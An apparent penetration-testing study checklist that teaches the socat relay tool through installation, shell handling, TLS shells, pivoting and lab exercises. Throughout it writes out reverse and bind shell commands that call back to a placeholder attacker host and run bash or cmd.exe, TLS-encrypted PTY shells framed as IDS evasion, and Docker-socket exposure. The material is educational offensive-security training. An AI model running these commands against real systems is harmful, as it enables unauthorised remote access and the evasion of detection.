# 📡 socat: Complete Mastery Checklist

> **What is socat?** socat (SOcket CAT) is a multipurpose relay tool — a bidirectional data transfer bridge between virtually any two endpoints: TCP, UDP, UNIX sockets, files, pipes, serial ports, TLS, IPv4, IPv6, or a process's stdin/stdout. It is Netcat on steroids: where Netcat can connect two TCP sockets, socat can relay between any two communication channels, with optional TLS encryption, forking, and access control.
>
> **Why does it exist?** Netcat has no native TLS support and limited protocol flexibility. socat fills these gaps, making it the preferred tool when you need encrypted shells, protocol bridging, port forwarding with access control, or any relay that Netcat cannot handle cleanly.
>
> **When to use it:** Encrypted reverse/bind shells (TLS over socat — evades basic IDS), port forwarding and pivoting, bridging incompatible socket types (e.g., UNIX socket to TCP), creating PTY (pseudo-terminal) shells for fully interactive sessions, and any scenario where plain Netcat is insufficient.
>
> **When to avoid it:** When you only need a simple unencrypted connection and Netcat works fine — socat's syntax is more complex and error-prone. For high-volume data transfer, use `iperf3` or `rsync`. For persistent tunnels, use `Chisel` or `Ligolo-ng`.
>
> **What mastering socat unlocks:** Fully interactive encrypted shells (the biggest shell upgrade from Netcat), protocol relay skills for pivoting through restricted networks, PTY shell stabilization (solving the interactive shell problem), and the ability to bridge any two communication channels in the field.
>
> **Roadmap Stage / Module:** Stage 2: Module 13 (System Hacking — Shell Handling & Redirection)

---

## 🧭 Navigation

> [🏠 Master Roadmap](../README.md) · [🔧 Tools Index](README.md)

| Shell & Pivoting | Networking | Tunneling | Crypto |
|:----------------|:-----------|:----------|:-------|
| [🔌 Netcat](Netcat.md) | [🗺️ Nmap](Nmap.md) | [🐛 Chisel](Chisel.md) | [🔐 OpenSSL](OpenSSL.md) |
| **📡 socat** (you are here) | [🔥 Responder](Responder.md) | [🌐 Ligolo-ng](Ligolo-ng.md) | [💀 Metasploit](Metasploit_Framework.md) |

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Installation & Basic Relays | 4 | 1–2 hours |
| 2 | Shell Handling (Bind, Reverse, PTY) | 7 | 3–4 hours |
| 3 | TLS Encrypted Shells | 5 | 2–3 hours |
| 4 | Port Forwarding & Pivoting | 5 | 3–4 hours |
| 5 | Advanced: Forking, Exec, File Transfer | 4 | 2–3 hours |
| 6 | Practical Labs | 4 | 4–6 hours |
| | **Total** | **29** | **~15–22 hours** |

**Prerequisites:** Netcat basics (Phase 2 Part 5 Stage 1 complete). Comfort with TCP/UDP concepts, ports, and shell types.

---

# PHASE 1: INSTALLATION & BASIC RELAYS

---

## 1.1 Installation

```bash
# Debian/Ubuntu
sudo apt install socat

# RedHat/CentOS
sudo yum install socat

# Verify
socat -V
```

## 1.2 socat Syntax Pattern

socat always takes **two addresses**:

```
socat [options] <address1> <address2>
```

Data flows **bidirectionally** between address1 and address2. Each address can be a TCP socket, file, pipe, stdin, SSL, exec, or many other types.

```bash
# Address format: TYPE:parameters
TCP:host:port          # TCP client connection
TCP-LISTEN:port        # TCP server (single connection)
TCP-LISTEN:port,fork   # TCP server (multiple connections, fork per client)
EXEC:command           # Execute a command, relay its stdin/stdout
SSL:host:port          # TLS client connection
SSL-LISTEN:port        # TLS server
FILE:/path/to/file     # A file
STDIO                  # Standard input/output (terminal)
PTY                    # Pseudo-terminal (for interactive shells)
```

## 1.3 Basic Connection Tests

```bash
# Basic TCP relay — connect two sockets together (simplest test)
# Terminal 1: listener
socat TCP-LISTEN:4444 STDIO

# Terminal 2: connect and type
socat TCP:localhost:4444 STDIO

# Echo server (replies with what it receives)
socat TCP-LISTEN:4444,fork EXEC:'cat'

# Connect to a remote service (like telnet/netcat)
socat STDIO TCP:target.com:80
```

- [ ] **Understand `fork`:** Without `fork`, the listener exits after one connection. With `fork`, it spawns a new process per client and keeps listening. Essential for any multi-client scenario.
- [ ] **Understand `reuseaddr`:** `socat TCP-LISTEN:4444,reuseaddr,fork ...` allows immediate reuse of the port after a connection closes — prevents "address already in use" errors.

---

# PHASE 2: SHELL HANDLING (BIND, REVERSE, PTY)

---

## 2.1 Reverse Shell (Target connects back to attacker)

```bash
# Attacker: set up listener
socat TCP-LISTEN:4444,reuseaddr,fork STDIO

# Target (Linux): send reverse shell
socat TCP:attacker_ip:4444 EXEC:/bin/bash

# Target (Windows): send reverse shell
socat TCP:attacker_ip:4444 EXEC:cmd.exe,pipes
```

## 2.2 Bind Shell (Attacker connects to target)

```bash
# Target: bind shell listener
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Attacker: connect to it
socat TCP:target_ip:4444 STDIO
```

## 2.3 Fully Interactive PTY Shell (The Critical Upgrade)

This is socat's killer feature — a **fully interactive shell** with proper terminal size, Ctrl+C handling, tab completion, and vi/nano support. Plain Netcat cannot do this.

```bash
# Attacker: listener that allocates a PTY
socat TCP-LISTEN:4444,reuseaddr FILE:`tty`,raw,echo=0

# Target: connect and spawn a PTY shell
socat TCP:attacker_ip:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**Breakdown of PTY options:**
- `pty` — allocate a pseudo-terminal
- `stderr` — merge stderr into the stream
- `setsid` — new session (detach from parent)
- `sigint` — pass Ctrl+C to the child process
- `sane` — reset terminal to sane settings

- [ ] **Why PTY matters:** Without PTY, commands like `sudo`, `vi`, `passwd`, `ssh`, `python`, and any interactive program fail or behave incorrectly. With PTY, the shell is indistinguishable from an SSH session for the purpose of running tools.
- [ ] **Resize the terminal:** After connecting, run `stty rows 50 cols 200` to match your actual terminal size, or use `export TERM=xterm` to enable colors.
- [ ] **Compare with Python PTY upgrade:** `python3 -c 'import pty;pty.spawn("/bin/bash")'` is the classic alternative but still lacks full terminal control. socat PTY is superior.

---

# PHASE 3: TLS ENCRYPTED SHELLS

---

TLS-encrypted shells bypass IDS/IPS signatures that look for plaintext shell commands and prevent passive network sniffing of your shell session.

## 3.1 Generate TLS Certificate for socat

```bash
# Generate a self-signed cert (valid 365 days, no passphrase)
openssl req -newkey rsa:2048 -nodes -x509 -days 365 \
  -keyout shell.key -out shell.crt \
  -subj "/CN=socat-shell"

# Combine into a PEM file (socat needs key+cert in one file)
cat shell.key shell.crt > shell.pem
```

## 3.2 TLS Reverse Shell

```bash
# Attacker: TLS listener
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,reuseaddr,fork STDIO

# Attacker: fully interactive TLS PTY listener
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,reuseaddr FILE:`tty`,raw,echo=0

# Target (Linux): encrypted reverse shell with PTY
socat OPENSSL:attacker_ip:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

- [ ] **`verify=0`:** Disables certificate verification on the client side (target). In a real engagement, if the target validates certs, you need a properly signed cert. `verify=0` is for quick lab use.
- [ ] **TLS vs plaintext in Wireshark:** Capture both a plain Netcat shell and a socat TLS shell with Wireshark. Confirm the TLS session shows encrypted Application Data, not readable commands. This is what IDS evasion looks like at the packet level.
- [ ] **`OPENSSL-LISTEN` vs `SSL-LISTEN`:** In newer versions of socat, `OPENSSL` is the keyword. Some older versions use `SSL`. Know which your version uses (`socat -h | grep -i ssl`).

## 3.3 TLS Bind Shell

```bash
# Target: TLS bind shell listener
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Attacker: connect to it
socat OPENSSL:target_ip:4444,verify=0 FILE:`tty`,raw,echo=0
```

---

# PHASE 4: PORT FORWARDING & PIVOTING

---

## 4.1 Local Port Forward (Expose a remote port locally)

```bash
# Forward local port 8080 → remote target:80
# (Useful when target:80 is not directly accessible from attacker)
socat TCP-LISTEN:8080,reuseaddr,fork TCP:target_ip:80

# Access via localhost
curl http://localhost:8080
```

## 4.2 Remote Port Forward (Expose a local service on a remote machine)

```bash
# On the pivot machine (that can reach both your machine and the target network):
# Forward pivot:8080 → internal target:80
socat TCP-LISTEN:8080,reuseaddr,fork TCP:internal_host:80
```

## 4.3 Bidirectional Relay / Pivot Chain

```bash
# Scenario: Attacker → Pivot → Internal Target
# Step 1: On pivot machine — relay attacker's port 4444 to internal target's port 4444
socat TCP-LISTEN:4444,reuseaddr,fork TCP:internal_target:4444

# Step 2: Attacker connects to pivot's port 4444, which relays to internal target
socat TCP-LISTEN:9999,reuseaddr STDIO
```

- [ ] **socat vs Chisel/Ligolo for pivoting:** socat requires execution on intermediate machines (can be noisy). Chisel/Ligolo-ng are dedicated tunnel tools with much better performance. Use socat for quick one-hop relays, dedicated tools for multi-hop or long-term pivots.

## 4.4 UDP Forwarding

```bash
# Forward UDP traffic (useful for DNS, SYSLOG, SNMP pivoting)
socat UDP-LISTEN:53,reuseaddr,fork UDP:internal_dns_server:53
```

---

# PHASE 5: ADVANCED — FORKING, EXEC, FILE TRANSFER

---

## 5.1 File Transfer

```bash
# Receiver (pulls file in)
socat TCP-LISTEN:4444,reuseaddr > received_file.txt

# Sender
socat TCP:receiver_ip:4444 < file_to_send.txt

# Faster with larger block size
socat -b 65536 TCP-LISTEN:4444,reuseaddr > received.bin
socat -b 65536 TCP:receiver_ip:4444 < send.bin
```

## 5.2 Execute Commands on Connection

```bash
# Run a Python HTTP server and relay connections
socat TCP-LISTEN:8080,reuseaddr,fork EXEC:"python3 -m http.server 9090"

# Run a specific script on each connection
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/path/to/script.sh

# Combine stdin/stdout of a process (useful for interactive tools)
socat STDIO EXEC:"ssh user@host",pty
```

## 5.3 UNIX Socket Bridging

```bash
# Bridge a UNIX domain socket to a TCP port (useful for Docker, databases)
socat TCP-LISTEN:5432,reuseaddr,fork UNIX-CONNECT:/var/run/postgresql/.s.PGSQL.5432

# Access a Docker socket over TCP (WARNING: security risk in real environments)
socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock
```

- [ ] **Docker socket exposure:** This is a real attack technique — if you can reach a socat relay exposing the Docker socket over TCP (or if the Docker daemon itself is exposed), you have full container/host control. Know this for Phase 2 and Phase 6 container escapes.

---

# PHASE 6: PRACTICAL LABS

---

- [ ] **Lab 1 — PTY Shell Comparison:** Get a shell with plain `nc` (Netcat), with `python3 -c 'import pty;pty.spawn("/bin/bash")'`, and with `socat PTY`. Try running `vi`, `sudo -s`, and `passwd` in each. Document what breaks in each and why the socat PTY is superior.

- [ ] **Lab 2 — TLS Shell vs IDS:** Set up Wireshark capturing on `lo`. Run a plaintext Netcat reverse shell and capture the output — you'll see shell commands in plaintext. Then repeat with a socat TLS encrypted shell. Confirm commands are now opaque. Write up what an IDS signature for Netcat shell would look like and why it misses TLS socat.

- [ ] **Lab 3 — Pivot Chain:** Set up 3 VMs: Attacker, Pivot, Target. Only Pivot can reach Target. Use socat on Pivot to relay traffic between Attacker and Target. Execute a reverse shell from Target → Pivot → Attacker. Document the relay command and the connection flow.

- [ ] **Lab 4 — HTB/VulnHub post-exploitation:** On any machine you compromise, replace your Netcat shell with a socat PTY shell. Practice making it persistent and upgrading it. Document which techniques work on which shell type.

---

## 📝 Operational Notes

- **socat exits on EOF:** By default, when one side closes, socat terminates. Add `ignoreeof` on the stdin side to prevent premature exit: `socat TCP-LISTEN:4444 STDIO,ignoreeof`.
- **Logging:** Use `socat -v` for verbose hex dump of transferred data (useful for debugging protocol relays). Use `socat -d -d` for debug-level logging.
- **IPv6:** socat supports IPv6 natively — `TCP6-LISTEN:4444` or `TCP6:host:port`.
- **`pipes` for Windows:** When running socat on Windows or relaying to a Windows target, `EXEC:cmd.exe,pipes` uses pipes instead of PTY (Windows doesn't have PTY). The shell is less interactive but functional.
- **OPSEC:** socat binaries can be precompiled statically and uploaded to targets. Use static builds from `https://github.com/andrew-d/static-binaries` for Linux targets without socat installed.
- **socat vs ncat:** ncat (Nmap's version of Netcat) also supports TLS via `--ssl`. For pure TLS shells, ncat `--ssl` is simpler syntax. For anything more complex (PTY, protocol relay, forking), socat wins.
